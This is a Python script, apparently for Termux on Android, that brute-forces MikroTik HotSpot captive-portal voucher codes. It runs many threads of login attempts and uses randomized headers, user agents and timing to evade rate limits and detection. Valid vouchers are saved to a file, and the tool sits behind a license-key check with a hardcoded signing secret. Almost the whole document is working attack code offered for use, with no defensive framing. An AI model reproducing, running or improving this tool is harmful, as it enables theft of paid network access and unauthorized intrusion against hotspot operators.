#!/usr/bin/env python3
"""
MikroTik HotSpot Brute Force - Multi-Worker Edition
config.ini driven + License System
"""

import requests
import random
import string
import sys
import os
import re
import time
import json
import hmac
import base64
import hashlib
import threading
import configparser
import subprocess
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue, Empty

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────────────────
# COLORS
# ──────────────────────────────────────────────────────────────────────────
class c:
    purple = '\033[95m'
    ob     = '\033[94m'
    oc     = '\033[96m'
    og     = '\033[92m'
    warn   = '\033[93m'
    error  = '\033[91m'
    n      = '\033[0m'
    bold   = '\033[1m'


# ═══════════════════════════════════════════════════════════════════════════
#  LICENSE SYSTEM
# ═══════════════════════════════════════════════════════════════════════════
LICENSE_SECRET  = "MoHotSpot2026!@#SecureKey240325"   # Key generator နဲ့ ကိုက်ရမယ်
LICENSE_FILE    = os.path.expanduser("~/.mo_license.dat")
LICENSE_SERVER  = None  # Optional: online validation (None = offline only)
LICENSE_MAX_DAYS = 30


def get_device_id() -> str:
    """Stable device fingerprint"""
    try:
        model = subprocess.run(
            ["getprop", "ro.product.model"],
            capture_output=True, text=True, timeout=3
        ).stdout.strip()
    except Exception:
        model = "Unknown"

    try:
        with open("/data/data/com.termux/files/usr/lib/android_id") as f:
            android_id = f.read().strip()
    except Exception:
        android_id = "0000000000000000"

    raw = f"{android_id}:{model}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()


def _sign(payload: str) -> str:
    """HMAC-SHA256 signature"""
    return hmac.new(
        LICENSE_SECRET.encode(),
        payload.encode(),
        hashlib.sha256
    ).hexdigest()


def _encode_license(data: dict) -> str:
    """Encode license dict → base64(json + signature)"""
    payload = json.dumps(data, separators=(",", ":"), sort_keys=True)
    sig = _sign(payload)
    blob = json.dumps({"p": payload, "s": sig}, separators=(",", ":"))
    return base64.b64encode(blob.encode()).decode()


def _decode_license(encoded: str) -> dict | None:
    """Decode license → dict (returns None if invalid)"""
    try:
        blob = base64.b64decode(encoded.encode()).decode()
        obj = json.loads(blob)
        payload = obj["p"]
        sig = obj["s"]

        if not hmac.compare_digest(_sign(payload), sig):
            return None

        return json.loads(payload)
    except Exception:
        return None


def save_license(data: dict) -> None:
    with open(LICENSE_FILE, "w") as f:
        f.write(_encode_license(data))


def load_license() -> dict | None:
    if not os.path.exists(LICENSE_FILE):
        return None
    try:
        with open(LICENSE_FILE) as f:
            return _decode_license(f.read().strip())
    except Exception:
        return None


def verify_license() -> tuple[bool, str]:
    """
    Returns (is_valid, message)
    Checks: signature, expiry, device binding
    """
    lic = load_license()
    if not lic:
        return False, "No license found"

    # Device binding
    if lic.get("dev") != get_device_id():
        return False, "License is for a different device"

    # Expiry check
    try:
        exp = datetime.strptime(lic["exp"], "%Y-%m-%d")
    except Exception:
        return False, "Invalid expiry format"

    now = datetime.now()
    if now > exp:
        days_left = (exp - now).days
        return False, f"License expired ({abs(days_left)} days ago)"

    days_left = (exp - now).days
    return True, f"Valid until {lic['exp']} ({days_left} days left)"


def activate_license(key: str) -> tuple[bool, str]:
    """
    Activate with a license key.
    Key format: MO-XXXX-XXXX-XXXX-XXXX-<expiry_days>-<signature>
    """
    key = key.strip().upper()

    # Parse key
    m = re.match(
        r"^MO-([A-Z0-9]{4})-([A-Z0-9]{4})-([A-Z0-9]{4})-([A-Z0-9]{4})-(\d+)-([A-F0-9]{16})$",
        key
    )
    if not m:
        return False, "Invalid key format"

    seg1, seg2, seg3, seg4, days_str, sig = m.groups()
    try:
        days = int(days_str)
    except ValueError:
        return False, "Invalid expiry"

    # Rebuild payload & verify signature
    dev = get_device_id()
    payload = f"{seg1}-{seg2}-{seg3}-{seg4}:{days}:{dev}"
    expected_sig = _sign(payload)[:16].upper()

    if not hmac.compare_digest(sig, expected_sig):
        return False, "Invalid signature (key mismatch)"

    # Build license record
    exp_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    lic_data = {
        "key": f"{seg1}-{seg2}-{seg3}-{seg4}",
        "dev": dev,
        "exp": exp_date,
        "activated": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    save_license(lic_data)
    return True, f"Activated until {exp_date}"


def license_gate() -> None:
    """Entry guard — exits if license invalid"""
    ok, msg = verify_license()
    if ok:
        print(f"{c.og}[✓] License: {msg}{c.n}")
        return

    print(f"{c.warn}[!] {msg}{c.n}")
    print(f"{c.oc}[*] Device ID: {get_device_id()}{c.n}")
    print()
    key = input(f"{c.oc}Enter License Key: {c.n}").strip()
    if not key:
        print(f"{c.error}[!] No key entered. Exiting.{c.n}")
        sys.exit(1)

    ok, msg = activate_license(key)
    if ok:
        print(f"{c.og}[✓] {msg}{c.n}")
    else:
        print(f"{c.error}[!] {msg}{c.n}")
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG LOADER
# ═══════════════════════════════════════════════════════════════════════════
def load_config(path="config.ini"):
    if not os.path.exists(path):
        print(f"{c.error}[!] config.ini not found!{c.n}")
        sys.exit(1)

    cfg = configparser.ConfigParser()
    cfg.read(path)

    return {
        'target_name':      cfg.get('TARGET', 'name', fallback='HotSpot'),
        'target_url':       cfg.get('TARGET', 'url'),
        'login_path':       cfg.get('TARGET', 'login_path', fallback='/login'),

        'code_length':      cfg.getint('SETTINGS', 'code_length', fallback=6),
        'charset':          cfg.get('SETTINGS', 'charset', fallback='0123456789'),
        'random_order':     cfg.getboolean('SETTINGS', 'random_order', fallback=True),

        'max_workers':      cfg.getint('SETTINGS', 'max_workers', fallback=50),
        'batch_submit':     cfg.getint('SETTINGS', 'batch_submit', fallback=200),
        'connection_pool':  cfg.getint('SETTINGS', 'connection_pool', fallback=100),

        'random_headers':   cfg.getboolean('SETTINGS', 'random_headers', fallback=True),
        'random_dst':       cfg.getboolean('SETTINGS', 'random_dst', fallback=True),

        'timeout':          cfg.getint('SETTINGS', 'timeout', fallback=10),
        'retry_count':      cfg.getint('SETTINGS', 'retry_count', fallback=2),

        'delay_min':        cfg.getfloat('SETTINGS', 'delay_min', fallback=0.0),
        'delay_max':        cfg.getfloat('SETTINGS', 'delay_max', fallback=0.05),

        'history_file':     cfg.get('HISTORY', 'file', fallback='history.txt'),
        'success_file':     cfg.get('HISTORY', 'success', fallback='success.txt'),

        'show_failed':      cfg.getboolean('OUTPUT', 'show_failed', fallback=False),
        'show_limited':     cfg.getboolean('OUTPUT', 'show_limited', fallback=True),
        'show_progress':    cfg.getboolean('OUTPUT', 'show_progress', fallback=True),
    }


# ═══════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ═══════════════════════════════════════════════════════════════════════════
CONF          = None
LOGIN_URL     = None
BASE_URL      = None
tried_codes   = set()
tried_lock    = threading.Lock()
success_event = threading.Event()
attempt_count = 0
attempt_lock  = threading.Lock()
valid_codes   = []
start_time    = time.time()


# ═══════════════════════════════════════════════════════════════════════════
#  RANDOM HEADERS
# ═══════════════════════════════════════════════════════════════════════════
def random_user_agent():
    android_ver = random.choice(['6','7','8','9','10','11','12','13','14'])
    chrome_ver  = random.randint(120, 139)
    models = ['K','SM-S911B','SM-A125F','Redmi Note 10','Pixel 5','M2101K7AG','CPH2211','V2027','SM-A536B']
    model = random.choice(models)
    return (f'Mozilla/5.0 (Linux; Android {android_ver}; {model}) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36')


def random_dst():
    return f'http://10.10.10.254{random.randint(0,9)}.{random.randint(0,9)}/'


def build_headers():
    if CONF['random_headers']:
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9','en-GB,en;q=0.8','en-US,en;q=0.9,my;q=0.8']),
            'Cache-Control': random.choice(['max-age=0','no-cache','no-store']),
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': BASE_URL,
            'Referer': LOGIN_URL,
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random_user_agent(),
        }
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': BASE_URL,
        'Referer': LOGIN_URL,
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }


# ═══════════════════════════════════════════════════════════════════════════
#  LOGIN WORKER
# ═══════════════════════════════════════════════════════════════════════════
def login(voucher):
    global attempt_count

    if success_event.is_set():
        return None

    with tried_lock:
        if voucher in tried_codes:
            return None
        tried_codes.add(voucher)

    headers = build_headers()
    data = {
        'dst':      random_dst() if CONF['random_dst'] else '',
        'popup':    'true',
        'username': voucher,
        'password': '',
    }

    for _ in range(CONF['retry_count']):
        if success_event.is_set():
            return None

        try:
            r = requests.post(
                LOGIN_URL, data=data, headers=headers,
                verify=False, timeout=CONF['timeout'],
                allow_redirects=False,
            )
            text = r.text.lower()

            with attempt_lock:
                attempt_count += 1

            # Success
            if r.status_code == 302 or 'logonurl' in text or 'success' in text:
                print(f"\n{c.og}{'='*50}{c.n}")
                print(f"{c.og}[✓] VALID VOUCHER: {voucher}{c.n}")
                print(f"{c.og}{'='*50}{c.n}")

                with tried_lock:
                    if voucher not in valid_codes:
                        valid_codes.append(voucher)
                        with open(CONF['success_file'], 'a') as f:
                            f.write(f"{voucher} | {time.ctime()}\n")

                success_event.set()
                return voucher

            # Failed
            elif 'invalid' in text or 'failed' in text:
                if CONF['show_failed']:
                    print(f"{c.error}[✗] {voucher}{c.n}")
                return None

            # Limited
            elif 'already' in text or 'limited' in text:
                if CONF['show_limited']:
                    print(f"{c.warn}[!] {voucher} - Rate limited{c.n}")
                time.sleep(2)
                return None

            else:
                if CONF['show_failed']:
                    print(f"{c.ob}[?] {voucher} - Unknown response{c.n}")
                return None

        except requests.exceptions.Timeout:
            time.sleep(0.5)
        except requests.exceptions.ConnectionError:
            time.sleep(1)
        except Exception:
            time.sleep(0.5)

    return None


# ═══════════════════════════════════════════════════════════════════════════
#  GENERATORS
# ═══════════════════════════════════════════════════════════════════════════
def random_code_generator():
    while not success_event.is_set():
        yield ''.join(random.choices(CONF['charset'], k=CONF['code_length']))


def sequential_shuffled_generator():
    total = 10 ** CONF['code_length']
    codes = [str(i).zfill(CONF['code_length']) for i in range(total)]
    random.shuffle(codes)
    for code in codes:
        if success_event.is_set():
            return
        yield code


# ═══════════════════════════════════════════════════════════════════════════
#  PROGRESS MONITOR
# ═══════════════════════════════════════════════════════════════════════════
def progress_monitor():
    while not success_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        speed = attempt_count / elapsed if elapsed > 0 else 0
        sys.stdout.write(
            f"\r{c.oc}[⚡] {speed:6.1f} c/s | "
            f"Tried: {attempt_count:>10,} | "
            f"Found: {len(valid_codes)} | "
            f"Time: {int(elapsed)}s{c.n}   "
        )
        sys.stdout.flush()


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN RUNNER
# ═══════════════════════════════════════════════════════════════════════════
def runner():
    global CONF, LOGIN_URL, BASE_URL

    # ── License gate ──
    license_gate()

    CONF = load_config()
    BASE_URL = CONF['target_url'].rstrip('/')
    LOGIN_URL = BASE_URL + CONF['login_path']

    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"""{c.error}

       ⚜M⚜A⚜X⚜ ⚜F⚜U⚜F⚜U⚜
    {c.n}""")
    print(f"  Target  : {c.oc}{CONF['target_name']}{c.n}")
    print(f"  URL     : {c.oc}{LOGIN_URL}{c.n}")
    print(f"  Length  : {c.oc}{CONF['code_length']}{c.n}")
    print(f"  Workers : {c.oc}{CONF['max_workers']}{c.n}")
    print(f"  Order   : {c.oc}{'RANDOM' if CONF['random_order'] else 'SEQUENTIAL'}{c.n}\n")

    if os.path.exists(CONF['history_file']):
        with open(CONF['history_file']) as f:
            for line in f:
                tried_codes.add(line.strip())
    print(f"{c.ob}[*] History loaded: {len(tried_codes):,} codes{c.n}\n")

    codes_iter = random_code_generator() if CONF['random_order'] else sequential_shuffled_generator()

    if CONF['show_progress']:
        threading.Thread(target=progress_monitor, daemon=True).start()

    print(f"{c.og}[+] Launching {CONF['max_workers']} workers...{c.n}\n")

    futures = []
    submitted = 0

    with ThreadPoolExecutor(max_workers=CONF['max_workers']) as pool:
        try:
            for code in codes_iter:
                if success_event.is_set():
                    break

                futures.append(pool.submit(login, code))
                submitted += 1

                if submitted % CONF['batch_submit'] == 0:
                    futures = [f for f in futures if not f.done()]
                    if CONF['delay_max'] > 0:
                        time.sleep(random.uniform(CONF['delay_min'], CONF['delay_max']))

                if len(futures) > CONF['max_workers'] * 4:
                    as_completed(futures, timeout=None)
                    futures = [f for f in futures if not f.done()]

            for f in as_completed(futures):
                if success_event.is_set():
                    for x in futures:
                        x.cancel()
                    break

        except KeyboardInterrupt:
            success_event.set()
            print(f"\n{c.warn}[!] Stopped by user{c.n}")

    elapsed = time.time() - start_time
    print(f"\n\n{c.og}{'='*50}{c.n}")
    print(f"{c.og}  SCAN COMPLETE{c.n}")
    print(f"{c.og}{'='*50}{c.n}")
    print(f"  Time     : {int(elapsed)}s")
    print(f"  Attempts : {attempt_count:,}")
    print(f"  Speed    : {attempt_count/elapsed:.1f} c/s")
    print(f"  Found    : {len(valid_codes)}")

    if valid_codes:
        print(f"\n{c.og}Valid Vouchers:{c.n}")
        for code in valid_codes:
            print(f"  {c.og}→ {code}{c.n}")
        print(f"\n{c.og}[✓] Saved to: {CONF['success_file']}{c.n}")


if __name__ == "__main__":
    runner()
